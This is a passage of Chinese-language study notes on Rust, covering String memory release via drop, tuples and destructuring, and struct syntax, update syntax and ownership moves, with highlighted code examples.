class=\"exturl\" data-url=\"aHR0cHM6Ly9jcmF0ZXMuaW8vY3JhdGVzL3V0Zjhfc2xpY2U=\">utf8_slice</span>。</p>\n<h3 id=\"字符串深度剖析\"><a class=\"anchor\" href=\"#字符串深度剖析\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTUlQUQlOTclRTclQUMlQTYlRTQlQjglQjIlRTYlQjclQjElRTUlQkElQTYlRTUlODklOTYlRTYlOUUlOTA=\">字符串深度剖析</span></h3>\n<p>那么问题来了，为啥  <code>String</code>  可变，而字符串字面值  <code>str</code>  却不可以？</p>\n<p>就字符串字面值来说，我们在编译时就知道其内容，最终字面值文本被直接硬编码进可执行文件中，这使得字符串字面值快速且高效，这主要得益于字符串字面值的不可变性。不幸的是，我们不能为了获得这种性能，而把每一个在编译时大小未知的文本都放进内存中（你也做不到！），因为有的字符串是在程序运行的过程中动态生成的。</p>\n<p>对于  <code>String</code>  类型，为了支持一个可变、可增长的文本片段，需要在堆上分配一块在编译时未知大小的内存来存放内容，这些都是在程序运行时完成的：</p>\n<ul>\n<li>首先向操作系统请求内存来存放  <code>String</code>  对象</li>\n<li>在使用完成后，将内存释放，归还给操作系统</li>\n</ul>\n<p>其中第一部分由  <code>String::from</code>  完成，它创建了一个全新的  <code>String</code> 。</p>\n<p>重点来了，到了第二部分，就是百家齐放的环节，在有<strong>垃圾回收 GC</strong> 的语言中，GC 来负责标记并清除这些不再使用的内存对象，这个过程都是自动完成，无需开发者关心，非常简单好用；但是在无 GC 的语言中，需要开发者手动去释放这些内存对象，就像创建对象需要通过编写代码来完成一样，未能正确释放对象造成的后果简直不可估量。</p>\n<p>对于 Rust 而言，安全和性能是写到骨子里的核心特性，如果使用 GC，那么会牺牲性能；如果使用手动管理内存，那么会牺牲安全，这该怎么办？为此，Rust 的开发者想出了一个无比惊艳的办法：变量在离开作用域后，就自动释放其占用的内存：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 从此处起，s 是有效的</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 使用 s</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span>                                  <span class=\"token comment\">// 此作用域已结束，</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                                   <span class=\"token comment\">//s 不再有效，内存被释放</span></pre></td></tr></table></figure><p>与其它系统编程语言的  <code>free</code>  函数相同，Rust 也提供了一个释放内存的函数：  <code>drop</code> ，但是不同的是，其它语言要手动调用  <code>free</code>  来释放每一个变量占用的内存，而 Rust 则在变量离开作用域时，自动调用  <code>drop</code>  函数：上面代码中，Rust 在结尾的  <code>&#125;</code>  处自动调用  <code>drop</code> 。</p>\n<blockquote>\n<p>其实，在 C++ 中，也有这种概念：<em>Resource Acquisition Is Initialization (RAII)</em>。如果你使用过 RAII 模式的话应该对 Rust 的  <code>drop</code>  函数并不陌生。</p>\n</blockquote>\n<p>这个模式对编写 Rust 代码的方式有着深远的影响，在后面章节我们会进行更深入的介绍。</p>\n<h2 id=\"元组\"><a class=\"anchor\" href=\"#元组\">#</a> 元组：</h2>\n<p>复合类型：</p>\n<h4 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h4>\n<p>可以通过一下用法创建元组：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> tup<span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">u8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">,</span><span class=\"token number\">6.4</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"模式匹配\"><a class=\"anchor\" href=\"#模式匹配\">#</a> 模式匹配：</h4>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">let</span> tup<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">600</span><span class=\"token punctuation\">,</span><span class=\"token number\">5.4</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">let</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span>tup<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"the value of y is &#123;&#125;\"</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上述代码首先创建一个元组，然后将其绑定到  <code>tup</code>  上，接着使用  <code>let (x, y, z) = tup;</code>  来完成一次模式匹配，因为元组是  <code>(n1, n2, n3)</code>  形式的，因此我们用一模一样的  <code>(x, y, z)</code>  形式来进行匹配，元组中对应的值会绑定到变量  <code>x</code> ，  <code>y</code> ，  <code>z</code>  上。这就是解构：用同样的形式把一个复杂对象中的值匹配出来。</p>\n<h4 id=\"用访问元组\"><a class=\"anchor\" href=\"#用访问元组\">#</a> 用。访问元组</h4>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> x<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">u8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6.4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">let</span> five_hundred <span class=\"token operator\">=</span> x<span class=\"token number\">.0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">let</span> six_point_four <span class=\"token operator\">=</span> x<span class=\"token number\">.1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">let</span> one <span class=\"token operator\">=</span> x<span class=\"token number\">.2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>索引从 0 开始</p>\n<p>使用实例：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> s1 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">calculate_length</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The length of '&#123;&#125;' is &#123;&#125;.\"</span><span class=\"token punctuation\">,</span> s2<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">calculate_length</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">usize</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">let</span> length <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//len () 返回字符串的长度</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"结构体\"><a class=\"anchor\" href=\"#结构体\">#</a> 结构体</h2>\n<h4 id=\"语法-2\"><a class=\"anchor\" href=\"#语法-2\">#</a> 语法:</h4>\n<p>中间的不是用；分隔，而是用，分割</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">User</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    active<span class=\"token punctuation\">:</span> <span class=\"token keyword\">bool</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    username<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    email<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    sign_in_count<span class=\"token punctuation\">:</span> <span class=\"token keyword\">u64</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>创建实例：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> user1 <span class=\"token operator\">=</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        email<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"someone@example.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        username<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"someusername123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        active<span class=\"token punctuation\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        sign_in_count<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>有几点值得注意:</p>\n<ol>\n<li>初始化实例时，<strong>每个字段</strong>都需要进行初始化</li>\n<li>初始化时的字段顺序<strong>不需要</strong>和结构体定义时的顺序一致</li>\n</ol>\n<h4 id=\"用访问结构体字段\"><a class=\"anchor\" href=\"#用访问结构体字段\">#</a> 用。访问结构体字段：</h4>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> user1 <span class=\"token operator\">=</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        email<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"someone@example.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        username<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"someusername123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        active<span class=\"token punctuation\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        sign_in_count<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    user1<span class=\"token punctuation\">.</span>email <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"anotheremail@example.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"简化结构体创建\"><a class=\"anchor\" href=\"#简化结构体创建\">#</a> 简化结构体创建：</h4>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">build_user</span><span class=\"token punctuation\">(</span>email<span class=\"token punctuation\">:</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">:</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">-></span><span class=\"token class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>email<span class=\"token punctuation\">:</span>email<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>username<span class=\"token punctuation\">:</span>username<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>active<span class=\"token punctuation\">:</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sign_in_count<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>它接收两个字符串参数：  <code>email</code>  和  <code>username</code> ，然后使用它们来创建一个  <code>User</code>  结构体，并且返回。可以注意到这两行：  <code>email: email</code>  和  <code>username: username</code> ，非常的扎眼，因为实在有些啰嗦，如果你从 TypeScript 过来，肯定会鄙视 Rust 一番，不过好在，它也不是无可救药：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">build_user</span><span class=\"token punctuation\">(</span>email<span class=\"token punctuation\">:</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">:</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">-></span><span class=\"token class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>email<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>username<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>active<span class=\"token punctuation\">:</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sign_in_count<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"结构体更新语法\"><a class=\"anchor\" href=\"#结构体更新语法\">#</a> 结构体更新语法：</h4>\n<p>用已有的 user1 来构建 user2：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> user2<span class=\"token operator\">=</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>active<span class=\"token punctuation\">:</span>user1<span class=\"token punctuation\">.</span>active<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>username<span class=\"token punctuation\">:</span>user1<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>email<span class=\"token punctuation\">:</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dwqdqd@example.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sign_in_count<span class=\"token punctuation\">:</span>user1<span class=\"token punctuation\">.</span>sign_in_count<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>rust 给的更新语法：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> user2<span class=\"token operator\">=</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>email<span class=\"token punctuation\">:</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dwqdqd@example.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">..</span>user1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>因为  <code>user2</code>  仅仅在  <code>email</code>  上与  <code>user1</code>  不同，因此我们只需要对  <code>email</code>  进行赋值，剩下的通过结构体更新语法  <code>..user1</code>  即可完成。</p>\n<p><code>..</code>  语法表明凡是我们没有显式声明的字段，全部从  <code>user1</code>  中自动获取。</p>\n<h6 id=\"需要注意的是-user1-必须在结构体的尾部使用\"><a class=\"anchor\" href=\"#需要注意的是-user1-必须在结构体的尾部使用\">#</a> 需要注意的是  <code>..user1</code>  必须在结构体的尾部使用。</h6>\n<pre><code>结构体更新语法跟赋值语句 `=` 非常相像，因此在上面代码中，`user1` 的部分字段所有权被转移到 `user2` 中：`username` 字段发生了所有权转移，作为结果，`user1` 无法再被使用。\n\n聪明的读者肯定要发问了：明明有三个字段进行了自动赋值，为何只有 `username` 发生了所有权转移？\n\n仔细回想一下[所有权](https://course.rs/basic/ownership/ownership.html#拷贝浅拷贝)那一节的内容，我们提到了 `Copy` 特征：实现了 `Copy` 特征的类型无需所有权转移，可以直接在赋值时进行 数据拷贝，其中 `bool` 和 `u64` 类型就实现了 `Copy` 特征，因此 `active` 和 `sign_in_count` 字段在赋值给 `user2` 时，仅仅发生了拷贝，而不是所有权转移。\n\n值得注意的是：`username` 所有权被转移给了 `user2`，导致了 `user1` 无法再被使用，但是并不代表 `user1` 内部的其它字段不能被继续使用，例如：\n</code></pre>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> user1 <span class=\"token operator\">=</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    email<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"someone@example.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    username<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"someusername123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    active<span class=\"token punctuation\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    sign_in_count<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">let</span> user2 <span class=\"token operator\">=</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    active<span class=\"token punctuation\">:</span> user1<span class=\"token punctuation\">.</span>active<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    username<span class=\"token punctuation\">:</span> user1<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    email<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"another@example.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    sign_in_count<span class=\"token punctuation\">:</span> user1<span class=\"token punctuation\">.</span>sign_in_count<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> user1<span class=\"token punctuation\">.</span>active<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 下面这行会报错</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> user1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"结构体的内存排列\"><a class=\"anchor\" href=\"#结构体的内存排列\">#</a> 结构体的内存排列：</h4>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token attribute attr-name\">#[derive(Debug)]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">File</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   name<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   data<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Vec</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">u8</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token keyword\">let</span> f1 <span class=\"token operator\">=</span> <span class=\"token class-name\">File</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>     name<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"f1.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     data<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Vec</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token keyword\">let</span> f1_name <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>f1<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token keyword\">let</span> f1_length <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>f1<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> f1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token macro 